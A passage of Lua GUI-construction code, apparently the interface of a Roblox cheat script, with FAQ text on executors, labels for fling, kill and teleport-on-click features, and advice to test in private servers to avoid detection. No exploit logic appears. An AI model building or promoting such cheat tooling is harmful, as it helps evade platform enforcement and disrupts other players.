G2L["1a8"]["Name"] = [[Separator]];
G2L["1a8"]["BackgroundTransparency"] = 1;
G2L["1a8"]["Position"] = UDim2.new(0.014986376278102398, 0, 0.38157889246940613, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1a9"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1a9"]["TextWrapped"] = true;
G2L["1a9"]["BorderSizePixel"] = 0;
G2L["1a9"]["TextScaled"] = true;
G2L["1a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a9"]["TextSize"] = 1;
G2L["1a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a9"]["Size"] = UDim2.new(0, 349, 0, 115);
G2L["1a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a9"]["Text"] = [[As long as you use a trusted executor and the script is from a reputable source, it should be safe. Always check the script code or scan it for malicious content before running it. (owner's note: this script does not contain anything malicious, it will only use HttpRequest when you use the script rating system)]];
G2L["1a9"]["Name"] = [[Separator]];
G2L["1a9"]["BackgroundTransparency"] = 1;
G2L["1a9"]["Position"] = UDim2.new(0.024523161351680756, 0, 0.21258644759655, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1aa"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1aa"]["TextWrapped"] = true;
G2L["1aa"]["BorderSizePixel"] = 0;
G2L["1aa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1aa"]["TextSize"] = 16;
G2L["1aa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1aa"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["1aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1aa"]["Text"] = [[- - - - - - - - - - ]];
G2L["1aa"]["Name"] = [[Separator]];
G2L["1aa"]["BackgroundTransparency"] = 1;
G2L["1aa"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1ab"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1ab"]["TextWrapped"] = true;
G2L["1ab"]["BorderSizePixel"] = 0;
G2L["1ab"]["TextScaled"] = true;
G2L["1ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ab"]["TextSize"] = 16;
G2L["1ab"]["TextColor3"] = Color3.fromRGB(176, 180, 255);
G2L["1ab"]["Size"] = UDim2.new(0, 338, 0, 21);
G2L["1ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ab"]["Text"] = [[¿ Can I use this on mobile ?]];
G2L["1ab"]["Name"] = [[Separator]];
G2L["1ab"]["BackgroundTransparency"] = 1;
G2L["1ab"]["Position"] = UDim2.new(0.014986376278102398, 0, 0.38157889246940613, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1ac"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1ac"]["TextWrapped"] = true;
G2L["1ac"]["BorderSizePixel"] = 0;
G2L["1ac"]["TextScaled"] = true;
G2L["1ac"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ac"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ac"]["TextSize"] = 1;
G2L["1ac"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ac"]["Size"] = UDim2.new(0, 349, 0, 85);
G2L["1ac"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ac"]["Text"] = [[Most scripts are designed for PC and require a Windows-based executor. Mobile exploitation is limited and less reliable, so this script likely won’t work on mobile.]];
G2L["1ac"]["Name"] = [[Separator]];
G2L["1ac"]["BackgroundTransparency"] = 1;
G2L["1ac"]["Position"] = UDim2.new(0.024523161351680756, 0, -0.08333340287208557, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1ad"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1ad"]["TextWrapped"] = true;
G2L["1ad"]["BorderSizePixel"] = 0;
G2L["1ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ad"]["TextSize"] = 16;
G2L["1ad"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ad"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["1ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ad"]["Text"] = [[- - - - - - - - - - ]];
G2L["1ad"]["Name"] = [[Separator]];
G2L["1ad"]["BackgroundTransparency"] = 1;
G2L["1ad"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1ae"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1ae"]["TextWrapped"] = true;
G2L["1ae"]["BorderSizePixel"] = 0;
G2L["1ae"]["TextScaled"] = true;
G2L["1ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ae"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ae"]["TextSize"] = 16;
G2L["1ae"]["TextColor3"] = Color3.fromRGB(176, 180, 255);
G2L["1ae"]["Size"] = UDim2.new(0, 338, 0, 21);
G2L["1ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ae"]["Text"] = [[¿ Can I use this script in private servers ?]];
G2L["1ae"]["Name"] = [[Separator]];
G2L["1ae"]["BackgroundTransparency"] = 1;
G2L["1ae"]["Position"] = UDim2.new(0.014986376278102398, 0, 0.38157889246940613, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1af"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1af"]["TextWrapped"] = true;
G2L["1af"]["BorderSizePixel"] = 0;
G2L["1af"]["TextScaled"] = true;
G2L["1af"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1af"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1af"]["TextSize"] = 1;
G2L["1af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1af"]["Size"] = UDim2.new(0, 349, 0, 85);
G2L["1af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1af"]["Text"] = [[Yes, most features will work in private servers. In fact, testing in a private server is recommended before using it in public to avoid detection or reports.]];
G2L["1af"]["Name"] = [[Separator]];
G2L["1af"]["BackgroundTransparency"] = 1;
G2L["1af"]["Position"] = UDim2.new(0.024523161351680756, 0, -0.08333340287208557, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1b0"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1b0"]["TextWrapped"] = true;
G2L["1b0"]["BorderSizePixel"] = 0;
G2L["1b0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b0"]["TextSize"] = 16;
G2L["1b0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b0"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["1b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b0"]["Text"] = [[- - - - - - - - - - ]];
G2L["1b0"]["Name"] = [[Separator]];
G2L["1b0"]["BackgroundTransparency"] = 1;
G2L["1b0"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1b1"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1b1"]["TextWrapped"] = true;
G2L["1b1"]["BorderSizePixel"] = 0;
G2L["1b1"]["TextScaled"] = true;
G2L["1b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b1"]["TextSize"] = 16;
G2L["1b1"]["TextColor3"] = Color3.fromRGB(255, 168, 169);
G2L["1b1"]["Size"] = UDim2.new(0, 338, 0, 21);
G2L["1b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b1"]["Text"] = [[¿ Is exploiting against Roblox TOS ?]];
G2L["1b1"]["Name"] = [[Separator]];
G2L["1b1"]["BackgroundTransparency"] = 1;
G2L["1b1"]["Position"] = UDim2.new(0.014986376278102398, 0, 0.38157889246940613, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1b2"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1b2"]["TextWrapped"] = true;
G2L["1b2"]["BorderSizePixel"] = 0;
G2L["1b2"]["TextScaled"] = true;
G2L["1b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b2"]["TextSize"] = 1;
G2L["1b2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b2"]["Size"] = UDim2.new(0, 349, 0, 85);
G2L["1b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b2"]["Text"] = [[Yes, exploiting is a violation of Roblox's Terms of Service. Using scripts may result in temporary or permanent bans from Roblox if detected.]];
G2L["1b2"]["Name"] = [[Separator]];
G2L["1b2"]["BackgroundTransparency"] = 1;
G2L["1b2"]["Position"] = UDim2.new(0.024523161351680756, 0, -0.08333340287208557, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FAQ.Separator
G2L["1b3"] = Instance.new("TextLabel", G2L["19b"]);
G2L["1b3"]["TextWrapped"] = true;
G2L["1b3"]["BorderSizePixel"] = 0;
G2L["1b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b3"]["TextSize"] = 16;
G2L["1b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b3"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["1b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b3"]["Text"] = [[- - - - - - - - - - ]];
G2L["1b3"]["Name"] = [[Separator]];
G2L["1b3"]["BackgroundTransparency"] = 1;
G2L["1b3"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener
G2L["1b4"] = Instance.new("ScrollingFrame", G2L["a"]);
G2L["1b4"]["Active"] = true;
G2L["1b4"]["BorderSizePixel"] = 0;
G2L["1b4"]["CanvasSize"] = UDim2.new(0, 0, 0, 970);
G2L["1b4"]["TopImage"] = [[]];
G2L["1b4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b4"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["1b4"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["1b4"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b4"]["Position"] = UDim2.new(0, 0, -6.667785612535226e-08, 0);
G2L["1b4"]["Visible"] = false;
G2L["1b4"]["Name"] = [[ALT_page_keylistener]];
G2L["1b4"]["BottomImage"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener.UIListLayout
G2L["1b5"] = Instance.new("UIListLayout", G2L["1b4"]);
G2L["1b5"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["1b5"]["Padding"] = UDim.new(0, 5);
G2L["1b5"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener.TemplateButton
G2L["1b6"] = Instance.new("TextButton", G2L["1b4"]);
G2L["1b6"]["TextWrapped"] = true;
G2L["1b6"]["TextStrokeTransparency"] = 0;
G2L["1b6"]["BorderSizePixel"] = 0;
G2L["1b6"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b6"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["1b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b6"]["TextSize"] = 20;
G2L["1b6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1b6"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["1b6"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["1b6"]["Name"] = [[TemplateButton]];
G2L["1b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b6"]["Text"] = [[Start Selection Mode  ]];
G2L["1b6"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener.TemplateButton.UIGradient
G2L["1b7"] = Instance.new("UIGradient", G2L["1b6"]);
G2L["1b7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener.onlyworkwhenguihiden
G2L["1b8"] = Instance.new("TextButton", G2L["1b4"]);
G2L["1b8"]["TextWrapped"] = true;
G2L["1b8"]["BorderSizePixel"] = 0;
G2L["1b8"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["1b8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b8"]["TextSize"] = 19;
G2L["1b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1b8"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["1b8"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["1b8"]["Name"] = [[onlyworkwhenguihiden]];
G2L["1b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b8"]["Text"] = [[Only Work When GUI is Hidden  ]];
G2L["1b8"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener.onlyworkwhenguihiden.Frame
G2L["1b9"] = Instance.new("Frame", G2L["1b8"]);
G2L["1b9"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["1b9"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["1b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b9"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener.onlyworkwhenguihiden.UIGradient
G2L["1ba"] = Instance.new("UIGradient", G2L["1b8"]);
G2L["1ba"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener.Separator
G2L["1bb"] = Instance.new("TextLabel", G2L["1b4"]);
G2L["1bb"]["TextWrapped"] = true;
G2L["1bb"]["BorderSizePixel"] = 0;
G2L["1bb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1bb"]["TextSize"] = 16;
G2L["1bb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bb"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["1bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bb"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["1bb"]["Name"] = [[Separator]];
G2L["1bb"]["BackgroundTransparency"] = 1;
G2L["1bb"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener.Separator
G2L["1bc"] = Instance.new("TextLabel", G2L["1b4"]);
G2L["1bc"]["TextWrapped"] = true;
G2L["1bc"]["BorderSizePixel"] = 0;
G2L["1bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1bc"]["TextSize"] = 16;
G2L["1bc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bc"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["1bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bc"]["Text"] = [[( ACTIVE KEY LISTENERS )]];
G2L["1bc"]["Name"] = [[Separator]];
G2L["1bc"]["BackgroundTransparency"] = 1;
G2L["1bc"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener.template
G2L["1bd"] = Instance.new("TextLabel", G2L["1b4"]);
G2L["1bd"]["TextWrapped"] = true;
G2L["1bd"]["BorderSizePixel"] = 0;
G2L["1bd"]["TextScaled"] = true;
G2L["1bd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bd"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1bd"]["TextSize"] = 16;
G2L["1bd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bd"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["1bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bd"]["Text"] = [[[numbertext Key Listener] key: "keyname", executes: "buttontext"]];
G2L["1bd"]["Name"] = [[template]];
G2L["1bd"]["Visible"] = false;
G2L["1bd"]["BackgroundTransparency"] = 1;
G2L["1bd"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_keylistener.template.ClickForRemove
G2L["1be"] = Instance.new("TextButton", G2L["1bd"]);
G2L["1be"]["BorderSizePixel"] = 0;
G2L["1be"]["TextTransparency"] = 1;
G2L["1be"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1be"]["TextSize"] = 14;
G2L["1be"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1be"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1be"]["Size"] = UDim2.new(0, 349, 0, 23);
G2L["1be"]["Name"] = [[ClickForRemove]];
G2L["1be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1be"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FrameBox
G2L["1bf"] = Instance.new("Frame", G2L["a"]);
G2L["1bf"]["Active"] = true;
G2L["1bf"]["BorderSizePixel"] = 0;
G2L["1bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bf"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["1bf"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["1bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bf"]["Position"] = UDim2.new(-0.00136239780113101, 0, -0.0019242136040702462, 0);
G2L["1bf"]["Visible"] = false;
G2L["1bf"]["Name"] = [[ALT_page_FrameBox]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FrameBox.Box
G2L["1c0"] = Instance.new("Frame", G2L["1bf"]);
G2L["1c0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c0"]["Size"] = UDim2.new(0, 344, 0, 168);
G2L["1c0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c0"]["Position"] = UDim2.new(0.03269754722714424, 0, 0.061403509229421616, 0);
G2L["1c0"]["Name"] = [[Box]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FrameBox.Box.MiniMap2DSimulation
G2L["1c1"] = Instance.new("LocalScript", G2L["1c0"]);
G2L["1c1"]["Name"] = [[MiniMap2DSimulation]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FrameBox.F
G2L["1c2"] = Instance.new("TextButton", G2L["1bf"]);
G2L["1c2"]["TextWrapped"] = true;
G2L["1c2"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
G2L["1c2"]["TextSize"] = 20;
G2L["1c2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c2"]["Size"] = UDim2.new(0, 70, 0, 26);
G2L["1c2"]["Name"] = [[F]];
G2L["1c2"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c2"]["Text"] = [[FLING]];
G2L["1c2"]["Position"] = UDim2.new(0.03269754722714424, 0, 0.8421052694320679, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FrameBox.K
G2L["1c3"] = Instance.new("TextButton", G2L["1bf"]);
G2L["1c3"]["TextWrapped"] = true;
G2L["1c3"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
G2L["1c3"]["TextSize"] = 20;
G2L["1c3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c3"]["Size"] = UDim2.new(0, 70, 0, 26);
G2L["1c3"]["Name"] = [[K]];
G2L["1c3"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c3"]["Text"] = [[KILL]];
G2L["1c3"]["Position"] = UDim2.new(0.25885558128356934, 0, 0.8421052694320679, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FrameBox.TOC
G2L["1c4"] = Instance.new("TextButton", G2L["1bf"]);
G2L["1c4"]["TextWrapped"] = true;
G2L["1c4"]["TextScaled"] = true;
G2L["1c4"]["BackgroundColor3"] = Color3.fromRGB(80, 80, 80);
G2L["1c4"]["TextSize"] = 20;
G2L["1c4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c4"]["TextColor3"] = Color3.fromRGB(56, 255, 0);
G2L["1c4"]["Size"] = UDim2.new(0, 180, 0, 26);
G2L["1c4"]["Name"] = [[TOC]];
G2L["1c4"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c4"]["Text"] = [[TELEPORT ON CLICK]];
G2L["1c4"]["Position"] = UDim2.new(0.47956404089927673, 0, 0.8421052694320679, 0);

-- StarterGui.MurderD0llan.MainWindow.StarterLabel
G2L["1c5"] = Instance.new("TextLabel", G2L["2"]);
G2L["1c5"]["TextWrapped"] = true;
G2L["1c5"]["BorderSizePixel"] = 0;
G2L["1c5"]["TextScaled"] = true;
G2L["1c5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1c5"]["TextSize"] = 14;
G2L["1c5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c5"]["Size"] = UDim2.new(0, 483, 0, 228);
G2L["1c5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c5"]["Text"] = [[By G0bbyD0llan]];
G2L["1c5"]["Name"] = [[StarterLabel]];
G2L["1c5"]["Visible"] = false;
G2L["1c5"]["BackgroundTransparency"] = 0.20000000298023224;
G2L["1c5"]["Position"] = UDim2.new(0, 0, 0.11583017557859421, 0);

-- StarterGui.MurderD0llan.MainWindow.ACTIVATE_CLOSE
G2L["1c6"] = Instance.new("Frame", G2L["2"]);
G2L["1c6"]["BorderSizePixel"] = 0;
G2L["1c6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c6"]["BackgroundTransparency"] = 1;
G2L["1c6"]["Size"] = UDim2.new(0, 482, 0, 259);
G2L["1c6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c6"]["Visible"] = false;
G2L["1c6"]["Name"] = [[ACTIVATE_CLOSE]];
-- Attributes
G2L["1c6"]:SetAttribute([[CHANGE_TO_TRIGGER]], false);

-- StarterGui.MurderD0llan.MainWindow.NOTIFICATION_TEXT
G2L["1c7"] = Instance.new("TextLabel", G2L["2"]);
G2L["1c7"]["TextWrapped"] = true;
G2L["1c7"]["TextStrokeTransparency"] = 0;
G2L["1c7"]["BorderSizePixel"] = 0;
G2L["1c7"]["TextScaled"] = true;
G2L["1c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c7"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c7"]["TextSize"] = 14;
G2L["1c7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c7"]["Size"] = UDim2.new(0, 327, 0, 30);
G2L["1c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c7"]["Name"] = [[NOTIFICATION_TEXT]];
G2L["1c7"]["Visible"] = false;
G2L["1c7"]["BackgroundTransparency"] = 0.9900000095367432;
G2L["1c7"]["Position"] = UDim2.new(0.16149067878723145, 0, 0.8146718144416809, 0);
-- Attributes
G2L["1c7"]:SetAttribute([[TEXT_TO_DISPLAY]], [[Label]]);

-- StarterGui.MurderD0llan.MainWindow.searchHere
G2L["1c8"] = Instance.new("TextBox", G2L["2"]);
G2L["1c8"]["ZIndex"] = 20;
G2L["1c8"]["TextSize"] = 14;
G2L["1c8"]["TextWrapped"] = true;
G2L["1c8"]["TextScaled"] = true;
G2L["1c8"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["1c8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1c8"]["PlaceholderText"] = [[enter to search here...]];
G2L["1c8"]["Size"] = UDim2.new(0, 113, 0, 17);
G2L["1c8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c8"]["Text"] = [[]];
G2L["1c8"]["Position"] = UDim2.new(0.761904776096344, 0, 0.9273278713226318, 0);
G2L["1c8"]["Visible"] = false;
G2L["1c8"]["Name"] = [[searchHere]];

-- StarterGui.MurderD0llan.Themes
G2L["1c9"] = Instance.new("TextLabel", G2L["1"]);
G2L["1c9"]["BorderSizePixel"] = 0;
G2L["1c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c9"]["TextSize"] = 14;
G2L["1c9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c9"]["Name"] = [[Themes]];
G2L["1c9"]["Visible"] = false;

-- StarterGui.MurderD0llan.Themes.Original
G2L["1ca"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1ca"]["BorderSizePixel"] = 0;
G2L["1ca"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ca"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ca"]["TextSize"] = 14;
G2L["1ca"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ca"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ca"]["Name"] = [[Original]];
G2L["1ca"]["Visible"] = false;
-- Attributes
G2L["1ca"]:SetAttribute([[COLOR_ACCENT_BLUE]], Color3.fromRGB(0, 121, 216));
G2L["1ca"]:SetAttribute([[COLOR_BORDER]], Color3.fromRGB(61, 61, 61));
